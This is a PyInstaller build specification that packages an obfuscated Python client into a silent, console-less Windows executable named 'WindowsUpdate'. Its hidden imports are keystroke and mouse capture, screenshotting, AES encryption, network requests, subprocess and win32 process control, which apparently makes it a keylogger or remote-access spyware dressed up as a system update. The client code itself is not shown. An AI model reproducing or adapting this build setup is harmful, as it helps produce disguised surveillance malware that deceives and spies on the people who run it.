# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['obfuscated/dist/client.py'],
    pathex=[],
    binaries=[],
    datas=[
        ('obfuscated/dist/pyarmor_runtime_000000', 'pyarmor_runtime_000000'),
    ],
    hiddenimports=[
        'pynput',
        'pynput.keyboard',
        'pynput.mouse',
        'requests',
        'Crypto',
        'Crypto.Cipher',
        'Crypto.Cipher.AES',
        'PIL',
        'PIL.Image',
        'mss',
        'psutil',
        'socket',
        'platform',
        'subprocess',
        'win32gui',
        'win32con',
        'win32api',
        'win32process',
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='WindowsUpdate',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,  # Pas de console
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=None,  # Ajouter un icon='icon.ico' si vous avez un icône
    version_file=None,
)
